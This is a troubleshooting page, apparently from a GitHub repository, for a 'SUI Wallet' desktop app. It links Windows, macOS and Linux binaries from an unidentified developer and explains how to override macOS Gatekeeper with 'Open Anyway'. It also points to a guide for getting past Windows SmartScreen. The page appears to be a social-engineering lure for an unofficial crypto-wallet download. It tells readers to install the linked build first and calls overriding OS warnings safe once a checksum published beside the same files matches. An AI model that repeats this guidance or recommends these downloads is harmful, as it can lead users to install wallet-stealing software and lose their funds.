![SUI Wallet](assets/banner-article.png)

# macOS cannot open SUI Wallet: Gatekeeper and the dmg

Gatekeeper refuses an app from an unidentified developer; the fix is in System Settings.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

macOS refuses a disk image for two different reasons, and they need different answers: Gatekeeper has not
seen the application before, or the copy is damaged because the image was not ejected properly. The first is
a panel you answer once; the second means downloading again. Neither is the wallet being broken.

## Reading which refusal it is

The wording tells you which problem you have. "Cannot be opened because the developer cannot be verified" is
Gatekeeper, and the answer is in System Settings under Privacy and Security. "Is damaged and should be moved
to the Trash" is a copy problem, and no amount of settings will fix it.

Those two sentences are the difference between a five-minute fix and an afternoon of changing security
settings for a file that was never going to run.

The two sentences are not interchangeable and neither produces the other: a damaged copy stays damaged however many times the panel is answered, while a Gatekeeper warning survives any number of fresh downloads. Reading the words before touching a setting is the difference between fixing this and fighting it.

## Answering Gatekeeper

Open System Settings, go to Privacy and Security, and scroll to the security section. The blocked application is named there with an Open Anyway button beside it; press it once and the app opens. Control-clicking it in Finder does the same thing.

The other route is to Control-click the application in Finder, choose Open, and confirm in the dialog that
appears. Both do the same thing: they tell macOS that this specific application is one you have decided to
run.

## Before you answer anything

Check the download first. The release notes publish a SHA-256 value beside the macOS asset, and `shasum -a
256` on the disk image produces the same string. If they match, the file is the one the project built and
the panel is about reputation rather than content.

If they do not match, delete the file and download again from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest). Answering a
Gatekeeper prompt for a file whose digest you have not checked is answering the wrong question.

## The damaged-copy case

A disk image that was opened from inside a mounted volume, or ejected while the application was still
running, can leave a copy that macOS reads as incomplete. The message about damage is accurate: the copy is
not what was published.

Delete the application, download the disk image again, check the digest, and this time drag the application
into Applications before ejecting. That order is what prevents the problem rather than fixing it afterwards.

## Moving it out of quarantine

A file downloaded from the internet carries a quarantine flag, which is what makes macOS check it on first
launch. Dragging the application into Applications does not remove the flag, which is why the panel can
appear after a correct install.

That is expected rather than a fault. The check happens once per copy, and after it the app opens normally
from the Applications folder like any other program.
[Installing SUI Wallet on macOS](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-install-on-macos.md) covers the install in order, and
[SUI Wallet won't open after install](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-wont-open-after-install.md) covers the case where the panel is answered and the app still
does not start.

## What not to do

Do not disable Gatekeeper entirely, and do not run the application from inside the mounted disk image. The
first trades a permanent risk for a one-time inconvenience; the second produces an app that behaves oddly
after every restart, because it was never installed.

Both are common advice on forums and both are wrong. The panel exists to make you look at a file once, and
looking once is all it asks.

There is also a third habit worth dropping: renaming the file or adding an extension to get past the panel. macOS is refusing the copy rather than the name, so the rename changes nothing except the difficulty of spotting what went wrong later.

## When it is neither

If the panel was answered, the digest matched, and the app still does not open, the cause is further down:
the build may predate the current release, or the machine may be below macOS 12. The current release is
where the reported problems are fixed, so install it before diagnosing anything else.

[installing SUI Wallet past SmartScreen](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/windows-protected-your-pc-sui-wallet.md) covers the Windows equivalent if you meet the same panel on
another machine - the reasoning is identical and only the operating system's wording changes.

## FAQ

### Why does macOS refuse to open the SUI Wallet dmg?

Either Gatekeeper has not seen the application before, which you answer once in Privacy and Security, or the
copy is incomplete because the image was not ejected properly, which means downloading again.

### Is it safe to click Open Anyway?

After the digest matches, yes. The button is a record of your decision about one application, not a global
setting, and it does not weaken anything else on the machine.

### Why does it say the app is damaged?

Because that copy is not what was published: an interrupted download or an image ejected mid-install
produces it. Delete it, download again and check the digest before running.

### Do I need to install from the disk image every time?

No. Drag the application into Applications once and eject the image; the app updates by replacing that copy
with a newer one later.

### Does this happen on every macOS version?

The wording and the location of the Settings panel differ, but the two causes are the same on every version
from macOS 12 onwards.

### Can I run it from the mounted image?

You can, and it will behave oddly after restarts. Dragging it into Applications is the install.
